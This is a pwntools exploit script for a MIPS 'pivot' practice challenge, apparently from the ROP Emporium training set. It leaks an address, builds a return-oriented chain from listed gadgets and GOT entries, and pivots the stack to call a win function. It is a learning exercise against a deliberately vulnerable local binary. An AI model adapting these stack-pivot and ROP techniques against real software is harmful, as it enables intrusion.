#!/usr/bin/env python3
from pwn import *
import os

os.environ["QEMU_LD_PREFIX"] = "/usr/mipsel-linux-gnu"

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'pivot_mipsel')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# ./pivot_mipsel_exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

# ropper --arch MIPS --file pivot_armv5
# 0x00400ca0: lw $t9, 8($sp); lw $t0, 4($sp); jalr $t9; addiu $sp, $sp, 0xc;
# 0x00400cb0: lw $t9, 8($sp); lw $t2, 4($sp); lw $t1, ($t2); jalr $t9; addiu $sp, $sp, 0xc
# 0x00400cc4: add $t9, $t0, $t1; jalr $t9; addiu $sp, $sp, 4;
# 0x00400cd0: move $sp, $fp; lw $ra, 8($sp); lw $fp, 4($sp); jr $ra; addiu $sp, $sp, 0xc;
LW_T9_T0_JALR_T9 = p32(0x400ca0)
LW_T9_T2_T1_JALR_T9 = p32(0x400cb0)
ADD_T9_T0_T1_JALR_T9 = p32(0x400cc4)
MOVE_SP_LW_RA_LW_FP_JR_RA = p32(0x400cd0)

# (r2) iS
# pd @ 0x00412020 (.got section)
# 0x00412060      .dword 0x00400e60 ; sym.imp.foothold_function
FOOTHOLD_GOT_PTR = p32(0x412060)
FOOTHOLD_GOT = p32(0x400e60)

# r2 libpivot_mipsel.so
# (r2) aaa; afl
# 0x00000d38    3    264 sym.ret2win
# 0x000009c0    1     88 sym.foothold_function
RET2WIN_OFFSET = 0xd38 - 0x9c0

io = start()

io.recvuntil(b"libpivot\n")
NEW_SP = int((io.recvline()[-9:-1]).decode(), 16)
io.recvuntil(b"> ")

# Payload
payload  = 2*p32(0xa5) + LW_T9_T0_JALR_T9
payload += 2*p32(0xa5) + FOOTHOLD_GOT
payload += p32(0xa5) + FOOTHOLD_GOT_PTR + LW_T9_T0_JALR_T9
payload += p32(0xa5) + p32(RET2WIN_OFFSET) + ADD_T9_T0_T1_JALR_T9

io.sendline(payload)

# Pivot

# (gdb) disassemble pwnme
#   0x00400c44 <+368>:	move	sp,s8
#   0x00400c48 <+372>:	lw	ra,60(sp)
#   0x00400c4c <+376>:	lw	s8,56(sp)
#   0x00400c50 <+380>:	addiu	sp,sp,64
#   0x00400c54 <+384>:	jr	ra
#   0x00400c58 <+388>:	nop

# "ra" had the value 0x6161616a, but fp(s8) can also be overwritten
padding = b'A' * cyclic_find(0x61616169) + p32(NEW_SP)

pivot = padding + MOVE_SP_LW_RA_LW_FP_JR_RA

io.recvuntil(b"> ")
io.sendline(pivot)

io.interactive()
